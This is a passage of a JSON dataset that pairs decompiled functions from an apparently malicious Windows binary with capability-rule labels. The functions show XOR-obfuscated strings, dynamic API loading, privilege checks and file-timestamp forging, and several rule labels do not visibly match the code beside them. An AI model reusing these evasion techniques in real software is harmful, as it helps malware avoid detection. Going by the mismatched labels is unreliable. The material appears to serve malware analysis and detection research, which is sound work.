!= 0; iVar3 = iVar3 + -1) {\n                *puVar6 = *puVar4;\n                puVar4 = puVar4 + 1;\n                puVar6 = puVar6 + 1;\n            }\n            puVar4 = in_EDX[2];\n            puVar6 = in_EDX[4] + var_8h + 0xc50 + uVar5;\n            for (iVar3 = in_EDX[5]; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar6 = *puVar4;\n                puVar4 = puVar4 + 1;\n                puVar6 = puVar6 + 1;\n            }\n            *(iVar1 + 0x30) = var_4h;\n            *(iVar1 + 0x34) = var_4h >> 0x1f;\n            piVar2 = in_EDX;\n            piVar7 = iVar1 + 0x18;\n            for (iVar3 = 0x18; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *piVar7 = *piVar2;\n                piVar2 = piVar2 + 1;\n                piVar7 = piVar7 + 1;\n            }\n            iVar3 = var_4h + 0xc50 + uVar5;\n            *(iVar1 + 0x18) = iVar3;\n            *(iVar1 + 0x1c) = iVar3 >> 0x1f;\n            iVar3 = in_EDX[4] + 0xc50 + uVar5 + var_4h;\n            *(iVar1 + 0x20) = iVar3;\n            *(iVar1 + 0x24) = iVar3 >> 0x1f;\n            *(iVar1 + 0x28) = in_EDX[4];\n            *(iVar1 + 0x2c) = in_EDX[5];\n            if (((arg_8h & 0x10) == 0) && ((*0x41ccc4 & 1) != 0)) {\n                iVar3 = fcn.0040eb6b();\n            }\n            else {\n                iVar3 = fcn.0040e844();\n            }\n            if (iVar3 == 0) {\n                pcVar8 = iVar1 + 0x40;\n                for (iVar3 = 0x800; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *pcVar8 = *var_20h;\n                    var_20h = var_20h + 1;\n                    pcVar8 = pcVar8 + 1;\n                }\n                iVar3 = fcn.0040f041(in_ECX, var_4h + uVar5 + 0x40, var_4h + uVar5, arg_8h);\n            }\n        }\n        if (var_8h != 0) {\n            fcn.00406467();\n        }\n        if (hObject != 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 1166
    },
    "00405d7d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00405d7d(void)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    uint var_48h;\n    uint var_24h;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint var_14h;\n    uint lpModuleName;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    lpModuleName = 0x6e72656b;\n    var_ch = 0x32336c65;\n    var_8h = 0x6c6c642e;\n    var_4h._0_1_ = 0;\n    var_24h = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu._0_4_;\n    uStack36 = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu._4_4_;\n    uStack32 = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu._8_4_;\n    uStack28 = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu._12_4_;\n    var_14h = 0x6f666e;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(&lpModuleName, &var_24h);\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    if (pcVar2 != NULL) {\n        (*pcVar2)(&var_48h);\n        if (var_48h == 9) {\n            *0x41ccc4 = 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 363
    },
    "0040bf29": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0040bf29(void)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t lpLibFileName;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_24h._0_2_ = 0x2016;\n    var_24h._2_1_ = 0x31;\n    stack0xffffffdb = 0x44381c11;\n    var_20h._3_1_ = 0x76;\n    var_1ch._0_1_ = 0x47;\n    var_18h = 0x70474477;\n    var_14h._0_2_ = 0x516c;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 10);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_4h = 6;\n    lpLibFileName = iVar3;\n    iVar7 = 0;\n    do {\n        puVar1 = iVar7 + iVar3;\n        iVar4 = iVar7 % 6;\n        iVar7 = iVar7 + 1;\n        *puVar1 = *(&var_18h + iVar4) ^ puVar1[&var_24h - iVar3];\n    } while (iVar7 < 9);\n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (*0x41cd38 == NULL) {\n        var_2ch = 0x3c12311e;\n        var_28h = 0x3d0b2217;\n        var_24h._0_2_ = 0x2b0f;\n        var_24h._2_1_ = 6;\n        stack0xffffffdb = 0x51262226;\n        var_20h._3_1_ = 0x7b;\n        var_1ch._0_1_ = 0x44;\n        var_1ch._1_1_ = 0x4f;\n        var_18h = 0x4861484d;\n        var_14h._0_2_ = 0x4f72;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x13);\n        iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar3 = lpLibFileName;\n        iVar4 = 0;\n        do {\n            puVar1 = iVar4 + iVar7;\n            iVar5 = iVar4 % var_4h;\n            iVar4 = iVar4 + 1;\n            *puVar1 = *(&var_18h + iVar5) ^ puVar1[&var_2ch - iVar7];\n        } while (iVar4 < 0x12);\n        uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar7);\n        *0x41cd38 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    (**0x41cd38)(&var_8h, 4);\n    if (var_8h < 0) {\n        var_8h = -var_8h;\n    }\n    iVar7 = var_8h;\n    uVar2 = (*pcVar6)(0, iVar3);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    return iVar7;\n}\n",
        "token_count": 917
    },
    "00406047": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00406047(int32_t param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    var_4h = 0;\n    if (param_1 != 0) {\n        if (param_2 == -1) {\n            param_2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1);\n        }\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, param_2 + 1);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        if ((iVar2 != 0) &&\n           (iVar3 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, param_2, iVar2, param_2 + 1, 0, 0), \n           iVar3 != 0)) {\n            var_4h = fcn.00405de6();\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 286
    },
    "00408a15": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00408a15(int32_t param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint extraout_ECX;\n    int32_t iVar4;\n    int32_t lpBuffer;\n    int32_t lpNumberOfBytesRead;\n    uint lpFileName;\n    int32_t lDistanceToMove;\n    int32_t var_4h;\n    \n    iVar4 = 0;\n    var_4h = 0;\n    iVar2 = fcn.004092a0();\n    if (iVar2 == 0) {\n        iVar2 = fcn.0040d5aa(extraout_ECX);\n        if ((iVar2 != 0) && (lDistanceToMove = fcn.0040d630(),  lDistanceToMove != 0)) {\n            cVar1 = '\\0';\n            if (((*0x41ccc4 & 1) != 0) && (*(*(param_1 + 0x3c) + 4 + param_1) == 0x14c)) {\n                cVar1 = fcn.00408d9a();\n                cVar1 = '\\x01' - (cVar1 != '\\0');\n            }\n            iVar4 = (*_sym.imp.KERNEL32.dll_CreateFileW)(lpFileName, 0x80000000, 1, 0, 3, 0x80, 0);\n            if (iVar4 != -1) {\n                iVar2 = (*_sym.imp.KERNEL32.dll_SetFilePointer)(iVar4, lDistanceToMove, 0, 0);\n                if (((iVar2 == lDistanceToMove) &&\n                    (iVar2 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar4, &lpBuffer, 4, &lpNumberOfBytesRead, 0), \n                    iVar2 != 0)) && (lpNumberOfBytesRead == 4)) {\n                    var_4h = lpBuffer + param_1;\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n            }\n            iVar4 = var_4h;\n            if (cVar1 != '\\0') {\n                fcn.00408d9a();\n                iVar4 = var_4h;\n            }\n        }\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpFileName);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return iVar4;\n}\n",
        "token_count": 542
    },
    "0040b387": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040b387(uint param_1)\n\n{\n    int32_t iVar1;\n    \n    *0x41cd2c = 1;\n    fcn.0040c58c(param_1);\n    fcn.00404559();\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(*0x41ccc0);\n    if (iVar1 != -1) {\n        fcn.0040de54();\n    }\n    fcn.0040af3b();\n    (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n    fcn.0040ae61();\n    return;\n}\n",
        "token_count": 140
    },
    "0040c840": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040c840(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t var_18h;\n    int32_t *var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar4 = -1;\n    iVar3 = 0;\n    var_10h = param_2 * 10;\n    var_ch = param_1;\n    do {\n        iVar1 = var_10h;\n        var_4h = 0;\n        var_8h = 0;\n        puVar5 = &var_18h;\n        for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar5 = 0;\n            puVar5 = puVar5 + 1;\n        }\n        iVar1 = fcn.0040bb4e(iVar1, 0, &var_8h, &var_4h);\n        if (iVar1 == 0) {\n            if (var_4h == var_8h) {\n                if (var_18h == 4) {\n                    iVar4 = *var_14h;\n                }\n                fcn.00407fc3();\n            }\n            if (iVar4 != -1) {\n                return iVar4;\n            }\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n        }\n        iVar3 = iVar3 + 1;\n        if (4 < iVar3) {\n            return iVar4;\n        }\n    } while( true );\n}\n",
        "token_count": 399
    },
    "0040d697": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040d697(int32_t *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t in_ECX;\n    int32_t *in_EDX;\n    int32_t iVar7;\n    uint var_ch;\n    uint var_8h;\n    int32_t lpNumberOfBytesRead;\n    \n    iVar7 = 0;\n    iVar2 = fcn.0040d833();\n    if (iVar2 != 0) {\n        in_ECX = iVar2;\n    }\n    iVar3 = (*_sym.imp.KERNEL32.dll_CreateFileW)(in_ECX, 0x80000000, 1, 0, 3, 0x80, 0);\n    if (iVar3 != -1) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetFileSize)(iVar3, 0);\n        if (iVar4 == 0) {\n            iVar4 = 0xe8;\n            goto code_r0x0040d739;\n        }\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, iVar4 + 2);\n        iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n        if (iVar7 != 0) {\n            iVar5 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar3, iVar7, iVar4, &lpNumberOfBytesRead, 0);\n            if (iVar5 != 0) {\n                if (iVar4 == lpNumberOfBytesRead) {\n                    *(iVar4 + iVar7) = 0;\n                    *in_EDX = iVar7;\n                    *arg_8h = iVar4;\n                    iVar4 = 0;\n                }\n                else {\n                    iVar4 = 0x1e;\n                }\n                goto code_r0x0040d739;\n            }\n        }\n    }\n    iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\ncode_r0x0040d739:\n    if (iVar3 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    if ((iVar7 != 0) && (iVar4 != 0)) {\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n        (*pcVar1)(uVar6);\n    }\n    if (iVar2 != 0) {\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n        (*pcVar1)(uVar6);\n    }\n    return iVar4;\n}\n",
        "token_count": 607
    },
    "0040d77b": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040d77b(uint nNumberOfBytesToWrite)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t in_ECX;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint lpLastWriteTime;\n    uint lpNumberOfBytesWritten;\n    \n    iVar1 = fcn.0040d833();\n    if (iVar1 != 0) {\n        in_ECX = iVar1;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileW)(in_ECX, 0xc0000000, 0, 0, 4, 0x80, 0);\n    if (iVar2 == -1) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    else {\n        fcn.0040dc3c(&lpLastWriteTime);\n        iVar4 = (*_sym.imp.KERNEL32.dll_WriteFile)(iVar2);\n        if (iVar4 == 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_SetEndOfFile)(iVar2);\n            uVar3 = 0;\n        }\n        (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar2, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n        (*_sym.imp.KERNEL32.dll_FlushFileBuffers)(iVar2);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    if (iVar1 != 0) {\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar1);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    }\n    return uVar3;\n}\n",
        "token_count": 411
    },
    "0040dc3c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040dc3c(uint lpLastWriteTime)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint in_EDX;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint lpSystemTime;\n    uint var_22h;\n    int16_t var_1eh;\n    int16_t var_1ch;\n    int16_t var_1ah;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint lpLastAccessTime;\n    uint lpCreationTime;\n    \n    iVar4 = *0x41cd3c;\n    lpLastAccessTime = in_EDX;\n    (*_sym.imp.KERNEL32.dll_GetSystemTime)(&lpSystemTime);\n    pcVar2 = _sym.imp.KERNEL32.dll_SystemTimeToFileTime;\n    uVar8 = iVar4 * 0x19660d + 0x3c6ef35f;\n    lpSystemTime._2_2_ = uVar8 % 0xb + 1;\n    uVar8 = uVar8 * 0x19660d + 0x3c6ef35f;\n    uVar6 = uVar8 * 0x19660d + 0x3c6ef35f;\n    var_22h._0_2_ = uVar8 % 0x1b + 1;\n    var_22h._2_2_ = uVar6 % 0x16 + 1;\n    uVar8 = uVar6 * 0x19660d + 0x3c6ef35f;\n    uVar6 = uVar8 * 0x19660d + 0x3c6ef35f;\n    var_1eh = uVar8 % 0x3b + 1;\n    var_1ch = uVar6 % 0x3b + 1;\n    lpSystemTime._0_2_ = lpSystemTime + -1;\n    var_1ah = (uVar6 * 0x17385ca9 + 0x47502932) % 0x3e6 + 1;\n    (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime);\n    (*pcVar2)(&lpSystemTime);\n    (*pcVar2)(&lpSystemTime, lpLastWriteTime);\n    var_5ch = 0x4443374d;\n    var_58h = 0x34596833;\n    var_54h = 0x37015a20;\n    var_50h = 0x687f4446;\n    var_4ch = 0x5a37346b;\n    var_48h = 0x44473711;\n    var_44h = 0x3452682e;\n    var_40h = 0x375b5a29;\n    var_3ch = 0x68064406;\n    var_38h = 0x5a293454;\n    var_34h = 0x441a370c;\n    var_30h = 0x344f683f;\n    var_2ch = 0x37685a21;\n    var_18h = 0x44343768;\n    var_14h._0_1_ = 0x5a;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x69);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar9 = 0;\n    do {\n        var_10h = 5;\n        puVar1 = iVar9 + iVar4;\n        iVar7 = iVar9 % 5;\n        iVar9 = iVar9 + 1;\n        *puVar1 = *(&var_18h + iVar7) ^ puVar1[&var_5ch - iVar4];\n    } while (iVar9 < 0x34);\n    iVar9 = fcn.0040d833();\n    if (iVar9 != 0) {\n        iVar7 = (*_sym.imp.KERNEL32.dll_CreateFileW)(iVar9, 0x80000000, 1, 0, 3, 0, 0);\n        if ((iVar7 != 0) && (iVar7 != -1)) {\n            iVar5 = (*_sym.imp.KERNEL32.dll_GetFileTime)(iVar9, lpCreationTime, lpLastAccessTime, lpLastWriteTime);\n            if (iVar5 == 0) {\n                (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, lpCreationTime);\n                (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, lpLastAccessTime);\n                (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, lpLastWriteTime);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar7);\n        }\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar9);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return 0;\n}\n",
        "token_count": 1306
    },
    "00405eae": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00405eae(uint param_1)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint pSid;\n    uint pIdentifierAuthority;\n    uchar var_10h;\n    uchar var_fh;\n    int32_t cbSid;\n    int32_t nSize;\n    uint32_t var_4h;\n    \n    *0x41ccd0 = param_1;\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    *0x41ccd8 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n    *0x41ccb8 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n    fcn.00409352();\n    fcn.00405d7d();\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x20);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    *0x41ccf4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    cbSid = 5;\n    if (*0x41ccf4 != 0) {\n        nSize = 0x10;\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetComputerNameW)(*0x41ccf4, &nSize);\n        if (iVar5 == 0) {\n            var_28h = 0x38264726;\n            var_24h = 0x6809731f;\n            var_20h = 0x47245477;\n            var_1ch._0_2_ = 0x3868;\n            pIdentifierAuthority = 0x38684773;\n            var_10h = 0x54;\n            uVar4 = (*pcVar3)(8, 0x1d);\n            iVar5 = (*pcVar2)(uVar4);\n            iVar7 = 0;\n            do {\n                puVar1 = iVar7 + iVar5;\n                iVar6 = iVar7 % cbSid;\n                iVar7 = iVar7 + 1;\n                *puVar1 = *(&pIdentifierAuthority + iVar6) ^ puVar1[&var_28h - iVar5];\n            } while (iVar7 < 0xe);\n            (*_sym.imp.KERNEL32.dll_lstrcpyW)(*0x41ccf4, iVar5);\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        }\n        fcn.004060be();\n    }\n    var_fh = 5;\n    pIdentifierAuthority = 0;\n    var_10h = 0;\n    var_4h = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                       (&pIdentifierAuthority, 2, 0x20, 0x220, 0, 0, 0, 0, 0, 0, &nSize);\n    pcVar2 = _sym.imp.ADVAPI32.dll_CheckTokenMembership;\n    if (var_4h != 0) {\n        iVar5 = (*_sym.imp.ADVAPI32.dll_CheckTokenMembership)(0, nSize, &var_4h);\n        var_4h = var_4h & -(iVar5 != 0);\n        (*_sym.imp.ADVAPI32.dll_FreeSid)(nSize);\n        if (var_4h != 0) {\n            if (*0x41ccd8 < 6) {\n                return 0;\n            }\n            fcn.004062f3();\n            goto code_r0x0040602e;\n        }\n    }\n    nSize = 0;\n    cbSid = 0xc;\n    nSize = (*_sym.imp.ADVAPI32.dll_CreateWellKnownSid)(0x27, 0, &pSid, &cbSid);\n    if (nSize != 0) {\n        (*pcVar2)(0, &pSid, &nSize);\n    }\ncode_r0x0040602e:\n    if (5 < *0x41ccd8) {\n        fcn.00405b04();\n    }\n    return 0;\n}\n",
        "token_count": 1001
    },
    "004077d7": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004077d7(uint param_1)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    uint lpBuffer;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t lpNumberOfBytesRead;\n    \n    iVar5 = 0;\n    var_8h = param_1;\n    do {\n        *0x41cd5c = 0;\n        var_ch = (*_sym.imp.KERNEL32.dll_CreateFileW)(var_8h, 0x80000000, 3, 0, 3, 0, 0);\n        if (var_ch != 0) {\n            while ((iVar3 = var_ch, \n                   iVar2 = (*_sym.imp.KERNEL32.dll_ReadFile)(var_ch, &lpBuffer, 0x200, &lpNumberOfBytesRead, 0), \n                   iVar2 != 0 && (lpNumberOfBytesRead != 0))) {\n                puVar4 = &lpBuffer;\n                iVar3 = lpNumberOfBytesRead;\n                do {\n                    uVar1 = *puVar4;\n                    puVar4 = puVar4 + 1;\n                    *0x41cd5c = *0x41cd5c >> 8 ^ *((uVar1 ^ *0x41cd5c & 0xff) * 4 + 0x4103a0) ^ 0xd202ef8d;\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != 0);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n            iVar3 = fcn.0040d697(0x41ccf8);\n            if (iVar3 == 0) {\n                return;\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n        iVar5 = iVar5 + 1;\n        if (4 < iVar5) {\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 451
    },
    "0040e4fc": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040e4fc(uchar *param_1)\n\n{\n    uint8_t *puVar1;\n    int16_t iVar2;\n    char cVar3;\n    uint uVar4;\n    int16_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int16_t *piVar8;\n    uchar *puVar9;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uchar *var_8h;\n    uint var_4h;\n    \n    if (param_1 != NULL) {\n        puVar9 = param_1;\n        for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar9 = 0;\n            puVar9 = puVar9 + 1;\n        }\n        var_8h = param_1;\n        cVar3 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n        if (cVar3 == '\\x05') {\n            var_28h = 0x613c3034;\n            var_24h = 0x53446720;\n            var_20h = 0x30064616;\n            var_1ch = 0x67236121;\n            var_18h._0_2_ = 0x5330;\n            var_14h = 0x61533067;\n            var_10h._0_1_ = 0x46;\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n            piVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n            var_4h = 5;\n            iVar6 = 0;\n            do {\n                puVar1 = iVar6 + piVar5;\n                iVar7 = iVar6 % 5;\n                iVar6 = iVar6 + 1;\n                *puVar1 = *(&var_14h + iVar7) ^ puVar1[&var_28h - piVar5];\n            } while (iVar6 < 0x12);\n            piVar8 = piVar5;\n            do {\n                iVar2 = *piVar8;\n                *((var_8h - piVar5) + piVar8) = iVar2;\n                piVar8 = piVar8 + 1;\n            } while (iVar2 != 0);\n        }\n        else {\n            var_50h = 0x4c5a6832;\n            var_4ch = 0x351c6109;\n            var_48h = 0x68006f3b;\n            var_44h = 0x610a4c47;\n            var_40h = 0x6f0d3534;\n            var_3ch = 0x4c456811;\n            var_38h = 0x3509612b;\n            var_34h = 0x68006f38;\n            var_30h = 0x61004c79;\n            var_2ch = 0x6f4c351f;\n            var_14h = 0x4c356861;\n            var_10h._0_1_ = 0x6f;\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x51);\n            piVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n            var_4h = 5;\n            iVar6 = 0;\n            do {\n                puVar1 = iVar6 + piVar5;\n                iVar7 = iVar6 % 5;\n                iVar6 = iVar6 + 1;\n                *puVar1 = *(&var_14h + iVar7) ^ puVar1[&var_50h - piVar5];\n            } while (iVar6 < 0x28);\n            piVar8 = piVar5;\n            do {\n                iVar2 = *piVar8;\n                *((var_8h - piVar5) + piVar8) = iVar2;\n                piVar8 = piVar8 + 1;\n            } while (iVar2 != 0);\n        }\n        var_4h = 5;\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar5);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    }\n    return;\n}\n",
        "token_count": 1083
    },
    "004062f3": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
